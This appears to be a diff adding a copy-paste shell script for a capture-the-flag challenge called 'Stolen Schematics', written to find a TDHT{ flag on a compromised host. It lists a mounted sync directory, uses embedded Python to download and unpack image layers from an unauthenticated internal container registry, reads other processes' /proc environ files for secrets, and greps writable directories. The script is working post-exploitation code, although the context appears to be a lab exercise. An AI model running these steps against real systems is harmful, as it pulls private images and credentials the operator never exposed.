@@ -1,0 +1,68 @@
+# STOLEN SCHEMATICS - ULTIMATE SEARCH
+# Based on full recon: .sync mounted, diagnostic images, watcher inactive
+# Copy-paste this into SSH
+
+# Quick wins first
+echo "[1] Check .sync directory"
+ls -laR /opt/mc/.sync/
+cat /opt/mc/.sync/* 2>/dev/null
+
+# Search diagnostic registry image (most likely location!)
+python3 << 'PYEND'
+import urllib.request, json, gzip, io, tarfile
+
+REG = "http://172.27.0.1:5000"
+repos = [("infra/stolen-schematics-diagnostic", ["team131-v2", "team131"])]
+
+def gj(u):
+    r = urllib.request.Request(u)
+    r.add_header("Accept", "application/vnd.oci.image.index.v1+json")
+    return json.load(urllib.request.urlopen(r, timeout=20))
+
+for repo, tags in repos:
+    for tag in tags:
+        try:
+            print(f"\n=== {repo}:{tag} ===")
+            m = gj(f"{REG}/v2/{repo}/manifests/{tag}")
+            for idx, L in enumerate(m.get("layers", [])):
+                d = urllib.request.urlopen(f"{REG}/v2/{repo}/blobs/{L['digest']}", timeout=30).read()
+                try:
+                    raw = gzip.decompress(d)
+                except:
+                    raw = d
+                if b"TDHT{" in raw:
+                    i = raw.find(b"TDHT{")
+                    print("\n" + "="*50)
+                    print("FLAG FOUND!")
+                    print("="*50)
+                    print(raw[i:i+100].decode('utf-8', 'replace'))
+                    exit(0)
+                try:
+                    tf = tarfile.open(fileobj=io.BytesIO(raw))
+                    for mem in tf.getmembers():
+                        if mem.isfile():
+                            c = tf.extractfile(mem).read()
+                            if b"TDHT{" in c:
+                                print("\n" + "="*50)
+                                print(f"FLAG in {mem.name}!")
+                                print("="*50)
+                                print(c.decode('utf-8', 'replace')[:300])
+                                exit(0)
+                            if "sync-loop.sh" in mem.name or "flag" in mem.name.lower():
+                                print(f"File: {mem.name}")
+                                txt = c.decode('utf-8', 'replace')
+                                if "TDHT" in txt or "FLAG" in txt:
+                                    print(txt[:500])
+                except:
+                    pass
+        except Exception as e:
+            print(f"Error: {e}")
+PYEND
+
+echo -e "\n[2] Check all process environments for FLAG"
+for pid in 1 15 16 17; do
+    cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -i "FLAG\|TDHT" && echo "^^^ PID $pid ^^^"
+done
+
+echo -e "\n[3] Search writable directories"
+find /tmp /home/player /opt/mc/logs /opt/mc/config -type f 2>/dev/null | xargs grep -l "TDHT{" 2>/dev/null
